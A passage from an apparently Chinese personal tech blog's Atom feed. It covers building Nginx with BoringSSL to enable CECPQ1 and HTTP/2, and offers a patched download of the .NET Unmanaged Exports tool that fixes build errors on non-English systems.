--with-http_realip_module \
--with-http_gunzip_module \
--with-http_gzip_static_module \
--with-http_slice_module \
--with-http_stub_status_module \
--without-select_module \
--without-poll_module \
--without-mail_pop3_module \
--without-mail_imap_module \
--without-mail_smtp_module

# 修改时间，避免 Nginx 再次编译 BoringSSL
touch ../boringssl/.openssl/include/openssl/ssl.h
</pre>
<p>然后就可以开始编译 Nginx 了， 直接执行：</p>
<pre class="brush: bash; title: ; notranslate">
make
</pre>
<p>一切正常的话，即可在 objs 目录里找到编译好的 Nginx。<br />
执行：</p>
<pre class="brush: bash; title: ; notranslate">
cd objs
./nginx -V
</pre>
<p>应该可以看到类似这样的输出：</p>
<pre class="brush: bash; title: ; notranslate">
nginx version: nginx/1.10.1
built with OpenSSL 1.0.2 (compatible; BoringSSL) (running with BoringSSL)
TLS SNI support enabled
configure arguments: --with-openssl=../boringssl --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=www-data --group=www-data --with-threads --with-file-aio --with-ipv6 --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_slice_module --with-http_stub_status_module --without-select_module --without-poll_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module
</pre>
<p>表明编译成功了。下面我们要将该 Nginx 安装至系统中。</p>
<hr />
<h2>安装 Nginx with BoringSSL</h2>
<p>由于配置服务需要一些额外的知识，因此为了简单起见，我采用了 <em>使用 apt 安装原版 Nginx 然后替换可执行文件</em> 的方式来简化安装和服务的配置。这也是为什么在上文中我建议使用和 apt 安装的 Nginx 相仿的配置来编译自己的 Nginx。</p>
<p>首先用 apt 来安装原版 Nginx：</p>
<pre class="brush: bash; title: ; notranslate">
# 从 Ubuntu 16.04 开始系统自带源的 nginx 就是1.10 版本的
apt-get install nginx
</pre>
<p>或者</p>
<pre class="brush: bash; title: ; notranslate">
# 先添加 Nginx 官方软件源
add-apt-repository ppa:nginx/stable
apt-get update
apt-get install nginx
</pre>
<p>然后替换原版 Nginx 为我们自己编译的版本：</p>
<pre class="brush: bash; title: ; notranslate">
# 先停止 Nginx 服务
service nginx stop

# 备份原版可执行文件
cp /usr/sbin/nginx  ./nginx.bak

# 替换 Nginx 可执行文件
cp nginx /usr/sbin/nginx

# 删除 Nginx 默认的 modules， 否则可能启动时报二进制不兼容的错误
rm /etc/nginx/modules-enabled/*
</pre>
<p>这样一来，就成功的将系统中的 Nginx 替换为我们自己编译的版本，同时又保留了原版的服务控制方式，非常方便。</p>
<hr />
<h2>配置 Cipher Suite</h2>
<p>在这里假定你已经知道如何配置 Nginx + SSL 了，如果不会，请百度或者谷歌一下。</p>
<p>为了启用 CECPQ1 算法，需要配置正确的 Cipher Suit：</p>
<pre class="brush: plain; title: ; notranslate">
ssl_ciphers &quot;[CECPQ1-ECDSA-AES256-GCM-SHA384|CECPQ1-ECDSA-CHACHA20-POLY1305-SHA256]:[CECPQ1-RSA-AES256-GCM-SHA384|CECPQ1-RSA-CHACHA20-POLY1305-SHA256]:[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305-SHA256]:[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305-SHA256]:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:RSA-AES128-GCM-SHA256:RSA-AES256-GCM-SHA384:RSA-AES128-SHA:RSA-AES256-SHA:RSA-3DES-EDE-SHA&quot;;
ssl_prefer_server_ciphers on;
</pre>
<p>其中最先出现的几个以“CECPQ1”开头的算法就是本文提到的算法。<br />
关于该 Cipher Suite 的格式和意思，也请参考《<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">使用 BoringSSL 优化 HTTPS 加密算法选择</a>》一文。</p>
<p>同时我们编译出的 Nginx 是支持 HTTP/2 以及 ALPN 的，在你的配置里写上：</p>
<pre class="brush: plain; title: ; notranslate">
listen 443 ssl http2;
</pre>
<p>即可启用最新最炫酷的 h2 啦！<br />
（当然谷歌又弄了个 QUIC 协议，目前不太容易在 Nginx 上实现，残念。）</p>
<hr />
<h2> 结束</h2>
<p>这篇教程到这里就结束啦~如果各位读者老爷发现有什么错误或不当之处，还请回复指正~</p>
<p>也欢迎各位共同探讨相关技术~</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html">Use CECPQ1 On Your Website with Nginx &#038; BoringSSL</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/unmanaged-exports.html</id>
        <title><![CDATA[Unmanaged Exports 修正版 .NET导出非托管函数]]></title>
        <updated>2016-06-19T07:05:21+08:00</updated>
        <link href="https://www.noisyfox.io/unmanaged-exports.html"/>
        <content type="text/html" src="https://www.noisyfox.io/unmanaged-exports.html"><![CDATA[<p>Unmanaged Exports 是一个将.NET编写的静态托管函数导出成可供C/C++等直接调用的非托管函数的工具。</p>
<hr />
<h2>它是如何工作的？</h2>
<p>创建一个新的或者修改已经存在的类库。<br />
然后加入 UnmanagedExports <a href="https://nuget.org/packages/UnmanagedExports" target="_blank">Nuget 包</a>。<br />
这基本就是所有要做的事情了。<br />
然后你就可以随便写一些静态方法，用[DllExport]装饰它，然后在原生代码中使用了。<br />
它很像 DllImport，你可以用MarshalAsAttribute来定义该函数的参数和结果的格式。<br />
在编译时，这个工具会自动修改IL代码增加导出声明。</p>
<h2>限制</h2>
<ul>
<li>你不能导出在同一个class中的重载函数，即便你指定了不同的导出名称。</li>
<li>另一个限制是你不能递归调用导出函数。</li>
</ul>
<p>这看起来是运行时的限制，并且我并不想为了规避这些限制而再把你的函数做一次包装。</p>
<hr />
<p>首先用C#（其它.NET语言也可）创建一个windows经典桌面dll，然后在Nuget中搜索并安装Unmanaged Exports这个包。</p>
<p>随后编写你要导出的静态函数，并添加[DllExport]注解，范例如下：</p>
<pre class="brush: csharp; title: ; notranslate">
class Test
{
  [DllExport(&quot;add&quot;, CallingConvention = CallingConvention.Cdecl)]
  public static int TestExport(int left, int right)
  {
     return left + right;
  } 
}
</pre>
<p>然后生成平台选择一个具体的平台（不能是AnyCPU否则该工具不生效），生成解决方案即可。<br />
该工具最新版只支持vs2008以后的vs，因为vs2008及以前的版本不支持nuget。</p>
<hr />
<p>工具官方网站及详细说明：<br />
<a href="https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports" target="_blank">https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports</a></p>
<hr />
<p>关于编译错误<br />
该工具在非英文操作系统上可能会出现编译错误的问题，具体表现如下：<br />
<a href="http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports" target="_blank">http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports</a><br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619143947.png"><img loading="lazy" class="aligncenter size-full wp-image-402" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619143947.png" alt="Unmanaged Exports 编译错误" width="1452" height="90" /></a><br />
主要原因是因为非英文操作系统中IL代码中含有非英文注释导致插件工作异常。<br />
虽然将系统语言切换成英文可以解决这个问题，但是这个方法过于麻烦，故本人修改了这个工具，修正了其在非英文操作系统上不能正常使用的问题。</p>
<p>文末附上修改后的文件，解压后将其中的两个dll替换进项目NuGet包中packages\UnmanagedExports.1.2.7\tools文件夹下的两个同名dll即可。<br />
改修正版仅针对Unmanaged Exports 1.2.7版本制作，其它版本未测，可能不能正常使用。<br />
替换完成后即可正常编译：<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619145913.png"><img loading="lazy" class="aligncenter size-full wp-image-403" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619145913.png" alt="Unmanaged Exports 编译正常" width="662" height="65" /></a><br />
<div class="sdm_download_item "><div class="sdm_download_item_top"><div class="sdm_download_thumbnail"></div><div class="sdm_download_title">DllExport-Fixed-1.2.7.7z</div></div><div style="clear:both;"></div><div class="sdm_download_description"><p>修正了非英文系统编译错误的Unmanaged Exports 1.2.7</p>
<h1></h1>
</div><div class="sdm_download_link"><span class="sdm_download_button"><a href="https://www.noisyfox.io/?smd_process_download=1&download_id=404" class="sdm_download green" title="DllExport-Fixed-1.2.7.7z" target="_blank">立即下载！</a></span><span class="sdm_download_item_count"><span class="sdm_item_count_number">1101</span><span class="sdm_item_count_string"> 下载</span></span></div></div><div class="sdm_clear_float"></div></p>
<p><a rel="nofollow" href="https://www.noisyfox.io/unmanaged-exports.html">Unmanaged Exports 修正版 .NET导出非托管函数</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
</feed>